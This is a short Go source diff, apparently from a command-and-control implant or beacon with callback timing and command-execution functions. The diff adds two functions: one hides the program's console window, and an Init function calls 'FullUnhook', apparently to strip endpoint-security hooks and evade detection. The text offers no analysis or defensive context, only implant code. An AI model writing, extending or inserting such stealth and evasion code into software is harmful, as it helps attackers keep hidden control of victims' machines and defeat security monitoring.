@@ -404,6 +404,10 @@ func CallbackTime() (time.Duration, error) {
 	return time.Duration(waitTime) * time.Millisecond, nil
 }
 
+func HideConsole() error {
+	return packet.HideConsole()
+}
+
 func ProcessDPIAware() error {
 	return packet.SetProcessDPIAware()
 }
@@ -468,4 +472,8 @@ func CmdService(Token uintptr) ([]byte, error) {
 
 func CmdRunu(b []byte) ([]byte, error) {
 	return packet.Runu(b)
+}
+
+func Init() error {
+	return packet.FullUnhook()
 }
